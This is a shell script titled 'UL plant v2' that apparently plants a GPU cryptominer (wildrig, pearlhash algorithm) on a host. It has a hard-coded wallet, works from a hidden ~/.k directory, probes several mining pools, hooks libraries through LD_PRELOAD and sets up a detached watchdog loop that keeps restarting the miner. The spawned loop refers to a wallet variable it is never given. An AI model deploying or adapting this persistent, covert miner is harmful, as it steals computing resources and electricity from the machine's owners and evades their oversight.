#!/bin/sh
# UL plant v2 — local OpenCL ICD manifest + TLS pool rungs (443 reachable from this host)
set -x
WALLET=${WALLET:-prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz}
WORKER=${WORKER:-ul-t2-unknown-g0}
K=${K:-$HOME/.k}
cd "$K" || exit 1

echo "== ocl inventory =="
ls -l /usr/lib/x86_64-linux-gnu/libnvidia-opencl* 2>&1 | head -4
ls -l /usr/lib/x86_64-linux-gnu/libOpenCL* 2>&1 | head -4
ls -l /etc/OpenCL/vendors/ 2>&1 | head -5

OPENCL=$(ls /usr/lib/x86_64-linux-gnu/libnvidia-opencl.so.570* 2>/dev/null | head -1)
[ -z "$OPENCL" ] && OPENCL=$(ls /usr/lib/x86_64-linux-gnu/libnvidia-opencl.so.* 2>/dev/null | head -1)
NVML=$(ls /usr/lib/x86_64-linux-gnu/libnvidia-ml.so.570* 2>/dev/null | head -1)
mkdir -p "$K/ocldir"
echo "$OPENCL" > "$K/ocldir/nvidia.icd"
echo "== icd=$OPENCL nvml=$NVML =="

cat > keep2.sh <<'S'
#!/bin/sh
K="$1"; W="$2"; P="$3"; NV="$4"
cd "$K" || exit 1
export OCL_ICD_VENDORS="$K/ocldir"
export LD_LIBRARY_PATH=/usr/lib/x86_64-linux-gnu
export LD_PRELOAD="$NV"
while true; do
  if ! pgrep -f "wildrig --algo pearlhash.*$W" >/dev/null 2>&1; then
    setsid nohup ./wildrig --algo pearlhash --url "$P" --user "$WALLET.$W" --pass x -d 0 >> m2.log 2>&1 &
  fi
  sleep 45
done
S
chmod +x keep2.sh

echo "== tcp tests =="
for HP in pearl.luckypool.io:443 prl-sg.kryptex.network:8048 prl-sg.kryptex.network:7048; do
  H=$(echo $HP | cut -d: -f1); P=$(echo $HP | cut -d: -f2)
  timeout 8 python3 -c "import socket;s=socket.create_connection(('$H',$P),6);print('$HP OPEN');print(s.recv(64)[:64])" 2>&1 | tail -2
done

echo "== direct run =="
OCL_ICD_VENDORS="$K/ocldir" LD_LIBRARY_PATH=/usr/lib/x86_64-linux-gnu LD_PRELOAD="$NVML" \
  timeout 45 ./wildrig --algo pearlhash --url stratum+ssl://pearl.luckypool.io:443 \
  --user "$WALLET.$WORKER" --pass x -d 0 2>&1 | tail -30

echo "== keep loop =="
pgrep -f "keep2.sh" >/dev/null 2>&1 || setsid nohup ./keep2.sh "$K" "$WORKER" "stratum+ssl://pearl.luckypool.io:443" "$NVML" >/dev/null 2>&1 &
sleep 20
pgrep -fa "wildrig --algo" | head -3
tail -12 m2.log 2>/dev/null
